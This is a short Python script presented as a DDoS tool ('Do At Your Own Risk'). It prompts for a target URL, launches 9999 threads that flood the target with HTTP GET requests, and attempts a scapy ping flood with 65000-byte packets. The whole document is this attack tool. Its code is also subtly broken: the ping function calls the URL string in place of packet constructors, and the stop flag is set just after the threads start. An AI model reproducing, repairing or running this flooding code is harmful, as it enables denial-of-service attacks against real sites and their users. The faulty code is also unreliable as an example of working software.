print("#################################################################") 
print("|     __   _____ __  _____ __  _   ________   __________  ____  |") 
print("|    / /  |__  //  |/  / // / / | / / ____/  /_  __/ __ \/ __ \ |")
print("|   / /    /_ </ /|_/ / // /_/  |/ / / __     / / / / / / / / / |")
print("|  / /______/ / /  / /__  __/ /|  / /_/ /    / / / /_/ / /_/ /  |")
print("| /_____/____/_/  /_/  /_/ /_/ |_/\____/    /_/  \____/_____/   |")
print("|                                                               |")  
print("#################################################################")   
print("")
print("[DDOS tools created by L3M4NG] | (2023) [Do At Your Own Risk]")
print("")
print("")
print("[-]Tembak Jangan Tak Ditembak!!!")
print("")
print("")
import requests
import threading
from scapy.all import *

user_url = input('[<>] Choose Your Target!!! :')
stop_processing = False

def send_request():
    global stop_processing
    while not stop_processing:
        try:
            response = requests.get(user_url)
            print(response.status_code)
        except:
            pass

def send_ping(user_url: str, number_of_packets_to_send: int = 10, size_of_packet: int = 65000):
    ip = user_url(dst= user_url)
    icmp = user_url()
    raw = Raw(b"X" * size_of_packet)
    p = ip / icmp / raw
    send(p, count=number_of_packets_to_send, verbose=0)
    print('send_ping(): Sent ' + str(number_of_packets_to_send) + ' pings of ' + str(size_of_packet) + ' size to ' + user_url)

threads = []
for i in range(9999):
    t = threading.Thread(target=send_request)
    threads.append(t)
    t.start()

def stop_processing_func():
    global stop_processing
    stop_processing = True

stop_processing_func()

# Call the send_ping() function with appropriate arguments
send_ping(user_url=user_url, number_of_packets_to_send=10, size_of_packet=65000)

# Register SIGINT signal handler
import signal
signal.signal(signal.SIGINT, lambda sig, frame: stop_processing_func())

# Call the send_ping() function with appropriate arguments
send_ping(user_url=user_url, number_of_packets_to_send=10, size_of_packet=65000)

